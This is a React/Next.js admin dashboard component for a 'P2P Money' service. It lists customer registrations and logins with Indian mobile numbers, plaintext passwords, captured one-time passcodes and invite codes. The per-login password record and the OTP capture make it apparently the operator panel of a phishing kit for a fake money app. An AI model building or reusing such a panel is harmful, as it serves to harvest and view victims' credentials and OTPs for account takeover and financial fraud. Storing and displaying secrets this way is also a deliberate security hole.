"use client";

import { useRouter } from "next/navigation";
import { useState } from "react";

interface Registration {
  id: string;
  mobile: string;
  password: string;
  inviteCode: string | null;
  otp: string | null;
  status: string;
  createdAt: string;
  updatedAt: string;
}

interface Login {
  id: string;
  mobile: string;
  password: string;
  createdAt: string;
}

interface AdminDashboardProps {
  registrations: Registration[];
  logins: Login[];
}

export default function AdminDashboard({ registrations, logins }: AdminDashboardProps) {
  const [tab, setTab] = useState<"registrations" | "logins">("registrations");
  const router = useRouter();

  async function handleLogout() {
    await fetch("/api/admin/logout", { method: "POST" });
    router.push("/admin/login");
    router.refresh();
  }

  async function handleRefresh() {
    router.refresh();
  }

  return (
    <div className="min-h-screen bg-slate-50">
      <header className="bg-white border-b border-slate-200 px-6 py-4 flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-slate-800">P2P Money Admin</h1>
          <p className="text-sm text-slate-500">View customer registrations and logins</p>
        </div>
        <div className="flex gap-3">
          <button
            onClick={handleRefresh}
            className="px-4 py-2 text-sm bg-slate-100 hover:bg-slate-200 rounded-lg text-slate-700"
          >
            Refresh
          </button>
          <button
            onClick={handleLogout}
            className="px-4 py-2 text-sm bg-red-500 hover:bg-red-600 rounded-lg text-white"
          >
            Logout
          </button>
        </div>
      </header>

      <div className="max-w-7xl mx-auto p-6">
        <div className="flex gap-2 mb-6">
          <button
            onClick={() => setTab("registrations")}
            className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors ${
              tab === "registrations"
                ? "bg-blue-500 text-white"
                : "bg-white text-slate-600 border border-slate-200"
            }`}
          >
            Registrations ({registrations.length})
          </button>
          <button
            onClick={() => setTab("logins")}
            className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors ${
              tab === "logins"
                ? "bg-blue-500 text-white"
                : "bg-white text-slate-600 border border-slate-200"
            }`}
          >
            Logins ({logins.length})
          </button>
        </div>

        {tab === "registrations" && (
          <div className="bg-white rounded-xl shadow-sm border border-slate-200 overflow-hidden">
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="bg-slate-50 border-b border-slate-200">
                    <th className="text-left px-4 py-3 font-semibold text-slate-600">Mobile</th>
                    <th className="text-left px-4 py-3 font-semibold text-slate-600">Password</th>
                    <th className="text-left px-4 py-3 font-semibold text-slate-600">OTP</th>
                    <th className="text-left px-4 py-3 font-semibold text-slate-600">Invite Code</th>
                    <th className="text-left px-4 py-3 font-semibold text-slate-600">Status</th>
                    <th className="text-left px-4 py-3 font-semibold text-slate-600">Time</th>
                  </tr>
                </thead>
                <tbody>
                  {registrations.length === 0 ? (
                    <tr>
                      <td colSpan={6} className="px-4 py-8 text-center text-slate-400">
                        No registrations yet
                      </td>
                    </tr>
                  ) : (
                    registrations.map((r) => (
                      <tr key={r.id} className="border-b border-slate-100 hover:bg-slate-50">
                        <td className="px-4 py-3 font-medium">+91 {r.mobile}</td>
                        <td className="px-4 py-3 font-mono text-slate-700">{r.password}</td>
                        <td className="px-4 py-3 font-mono text-slate-700">{r.otp || "—"}</td>
                        <td className="px-4 py-3 text-slate-600">{r.inviteCode || "—"}</td>
                        <td className="px-4 py-3">
                          <span
                            className={`inline-block px-2 py-0.5 rounded text-xs font-medium ${
                              r.status === "registered"
                                ? "bg-green-100 text-green-700"
                                : "bg-yellow-100 text-yellow-700"
                            }`}
                          >
                            {r.status}
                          </span>
                        </td>
                        <td className="px-4 py-3 text-slate-500 whitespace-nowrap">
                          {new Date(r.createdAt).toLocaleString()}
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {tab === "logins" && (
          <div className="bg-white rounded-xl shadow-sm border border-slate-200 overflow-hidden">
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="bg-slate-50 border-b border-slate-200">
                    <th className="text-left px-4 py-3 font-semibold text-slate-600">Mobile</th>
                    <th className="text-left px-4 py-3 font-semibold text-slate-600">Password</th>
                    <th className="text-left px-4 py-3 font-semibold text-slate-600">Time</th>
                  </tr>
                </thead>
                <tbody>
                  {logins.length === 0 ? (
                    <tr>
                      <td colSpan={3} className="px-4 py-8 text-center text-slate-400">
                        No logins yet
                      </td>
                    </tr>
                  ) : (
                    logins.map((l) => (
                      <tr key={l.id} className="border-b border-slate-100 hover:bg-slate-50">
                        <td className="px-4 py-3 font-medium">+91 {l.mobile}</td>
                        <td className="px-4 py-3 font-mono text-slate-700">{l.password}</td>
                        <td className="px-4 py-3 text-slate-500 whitespace-nowrap">
                          {new Date(l.createdAt).toLocaleString()}
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
